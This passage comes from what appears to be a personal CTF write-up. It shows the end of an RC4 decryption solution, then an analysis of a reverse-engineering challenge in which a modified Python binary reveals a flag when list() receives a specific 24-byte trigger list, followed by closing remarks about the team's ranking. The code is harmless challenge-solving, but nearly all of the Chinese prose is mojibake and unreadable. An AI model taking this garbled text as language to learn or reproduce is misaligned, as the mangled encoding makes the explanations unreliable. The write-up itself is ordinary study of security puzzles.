cipher = bytes.fromhex("a2 c3 9e cc 60 35 ee bf f5 7d 78 5a cd d5 c8 52 80 ae c6 19 56 f2 a7 cb d5 0b e1 61 b9 14")

key = b"b4r3MEt41"
ks = rc4_keystream(list(key), len(cipher))
flag_bytes = bytes([c ^ k for c, k in zip(cipher, ks)])

print(flag_bytes.decode())
```

</Details>

#### Flag

![Flag](./image-2.png)

`EOF{ExP3d14i0N_33_15_4he_G0AT}`

### Impure

é€™é¡Œæ¯”è³½æœŸé–“æ²’æœ‰åšå‡ºä¾† QQï¼Œè³½å¾Œè£œå®Œäº†ã€‚

![Impure challenge](./image-14.png)

ç„¶å¾Œæœ‰äººé€™æ¨£åšå‡ºä¾†äº†ï¼Œwtf ç ´å¤§é˜²ã€‚ã€‚ã€‚ã€‚

#### é¡Œç›®æè¿°

> Someone polluted our private fork of python...

å¦‚é¡Œï¼Œçµ¦äº†ä¸€å€‹è‡ªè£½çš„ python binary forked from python 3.15ï¼Œå°±é€™æ¨£ï¼Œæˆ‘å€‘è¦æ‰¾åˆ° flagã€‚

#### åˆ†æèˆ‡è§£æ³•

é‚£è‚¯å®šæ˜¯å…ˆç”¨ ghidra æ‰“é–‹ä¾†çœ‹ï¼Œæ²ƒè‰æœ‰ 800 è¬å€‹ function @@ï¼Œç›´æ¥äº‚æ‰¾ä¸è¡Œï¼Œåªå¥½è‡ªå·±ç·¨ä¸€å€‹æ­£ç‰ˆ python 3.15 ç„¶å¾Œæ‹¿å» bindiffï¼š

![BinDiff analysis](./image-15.png)

ã„œç„¶å¾Œå°±å¡æ­»äº†...æ¯å€‹ function éƒ½çœ‹éä¸€éé‚„æ˜¯å®Œå…¨ä¸çŸ¥é“è¦æ€éº¼è¾¦ã€‚

=== ä»¥ä¸‹æ˜¯è³½å¾Œåšçš„ ===

![Reverse engineering post-contest](./image-16.png)

å¥½è€¶ç¸½ä¹‹æˆ‘è³½ä¸­çœ‹åˆ°äº† `list_poorcompare` ä½†å®Œå…¨æ²’ç™¼ç¾ä¸å°å‹ï¼Œç ”ç©¶ä¸€ä¸‹ä»–åšçš„äº‹æƒ…æ˜¯ï¼š

1. åœ¨ `list(iterable)` æ™‚å·å·è¢«å«ï¼Œç”¨ `PySequence_Fast` æŠŠç¬¬äºŒå€‹åƒæ•¸è®Šæˆåºåˆ—ï¼Œå…ˆæª¢æŸ¥é•·åº¦æ˜¯ä¸æ˜¯ 24ã€‚
1. å¦‚æœé•·åº¦ä¸æ˜¯ 24ï¼Œæˆ–è£¡é¢æœ‰ä¸æ˜¯æ•´æ•¸çš„æ±è¥¿ï¼Œå°±ä»€éº¼éƒ½ä¸åšï¼Œå›å‚³ 0ã€‚
1. å¦‚æœ 24 å€‹å…ƒç´ å…¨éƒ¨éƒ½å‰›å¥½ç­‰æ–¼å…§å»ºçš„ `trigger_bytes`ï¼Œå®ƒå°±æŠŠå¦ä¸€å€‹å…§å»ºé™£åˆ— `python_path` æ¯å€‹ byte è·Ÿ `0xC4` XOR è§£ç¢¼æˆå­—ä¸²ï¼ŒæŠŠåŸæœ¬çš„ list æ”¹æˆåªå«é‚£å€‹å­—ä¸²çš„ä¸€å€‹å…ƒç´ ï¼Œä¸¦å›å‚³ 1ã€‚
1. error æ™‚å›å‚³ -1ã€‚

å› æ­¤æˆ‘å€‘åªè¦æŠŠ `trigger_bytes` æ”¾é€² list è£¡é¢ï¼Œç„¶å¾Œå‘¼å« `list()` å°±å¯ä»¥è§¸ç™¼é€™å€‹è¡Œç‚ºã€‚

```python
TRIGGER = [
    0x98, 0x92, 0x9f, 0x99,
    0xa5, 0x9c, 0xea, 0xbd,
    0xb5, 0x9a, 0xee, 0xb1,
    0x8c, 0xed, 0xba, 0x81,
    0x9d, 0xae, 0x87, 0x8a,
    0xe9, 0xee, 0xb0, 0xa3,
]

secret_list = list(TRIGGER)
print(secret_list)
```

ç„¶å¾Œç”¨ä»–çµ¦çš„ python binary åŸ·è¡Œï¼Œå°±å¯ä»¥æ‹¿åˆ° flagï¼

#### Flag

![Flag](./image-17.png)

`EOF{_B4CkD0oR3d_CpYT70N}`

## Pwn

ä¸€é¡Œéƒ½æ²’åšå‡ºä¾†ï¼Œç ´é˜²ã€‚

## å¾Œè¨˜

é€™æ‡‰è©²ç®—æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ­£å¼æ‰“çš„ CTF æ¯”è³½äº†ï¼Œå…¶å¯¦æ‰“çš„é‚„ç®—ä¸éŒ¯ï¼Œä¹Ÿå¾ˆé–‹å¿ƒå­¸åˆ°å¾ˆå¤šï¼Œæ²’æœ‰ä¿®è¨ˆç®—æ©Ÿå®‰å…¨é€™å ‚èª²ä¹‹å‰æˆ‘å¤§æ¦‚åªå¯«å¾—å‡ºä¸€é¡Œï¼Œç¾åœ¨æ„Ÿè¦ºå¯ä»¥å¯«å‡ºä¸€åŠçš„é¡Œç›®äº†ã€‚

æˆ‘å€‘æœ€å¾Œæ‹¿åˆ° rank 18ï¼Œç®—æ˜¯å¾ˆæ»¿æ„çš„æˆç¸¾ã„Œã€‚

<Grid cols={2}>
  ![æœ€çµ‚æ’å](./image-18.png "æœ€çµ‚æ’å") ![æœ€çµ‚æ’å](./image-20.png "æœ€çµ‚æ’å")
  ![å€‹äººè§£é¡Œåˆ†ä½ˆ](./featured.png "å€‹äººè§£é¡Œåˆ†ä½ˆ") ![åœ˜éšŠè§£é¡Œåˆ†ä½ˆ](./image-19.png "åœ˜éšŠè§£é¡Œåˆ†ä½ˆ")
</Grid>

å”¯ä¸€ä¸æ»¿æ„çš„åœ°æ–¹æ˜¯éš”å¤©æ˜¯ç·šä»£æœŸæœ«è€ƒï¼Œç„¶å¾Œæˆ‘ä¸€åš CTF å°±åœä¸ä¸‹ä¾†ï¼Œæ‰€ä»¥ç·šä»£ç‚¸äº† ripã€‚

ç¸½ä¹‹ï¼ŒçœŸçš„éå¸¸æ„Ÿè¬ StarMachine çš„éšŠå‹å€‘ï¼Œä¸‹æ¬¡æœ‰ç©ºå†ä¸€èµ·ç© CTFï¼Œ~~é‚„æœ‰æ„Ÿè¬ LLM æ•™æˆ‘çœ‹æ‡‚å¤§ä¾¿ code è·Ÿè­‰æ˜æ•¸å­¸~~
